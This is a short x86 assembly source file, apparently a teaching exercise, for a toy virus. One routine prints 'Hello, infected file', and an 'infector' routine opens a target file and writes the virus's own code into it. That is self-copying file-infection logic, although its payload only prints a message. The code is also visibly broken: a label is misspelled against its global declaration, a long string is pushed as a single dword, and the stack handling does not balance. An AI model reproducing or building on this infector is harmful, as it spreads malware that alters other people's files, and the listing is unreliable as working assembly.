section .rodata
    greet: db "Hello, infected file", 10, 0
section .text
global code_start
global infection
extern system_call

code_start:
    ifection:
        push ebp
        mov ebp, esp
        pushad
        mov eax, [ebp+8]
        and al, 0x01
        jnz end
        push dword 4
        push dword 1
        push dword "Hello,infected file"
        push dword 19
        call system_call
        add esp, 16
    end:
        add esp, 4
        popad
        pop ebp
        ret

    infector:
        push ebp
        mov ebp, esp
        sub esp, 4
        pushad
        mov eax, [ebp+8]
        push dword 5
        push dword eax
        push dword 0x0008
        call system_call
        mov [ebp-4], eax
        add esp, 12
        push dword 4
        push dword code_start
        mov ebx, code_end
        sub ebx, code_start
        push dword ebx
        call system_call
        add esp, 12
        mov eax, [ebp-4]
        push dword eax
        popad
        add esp, 4
        pop ebp
        ret
code_end: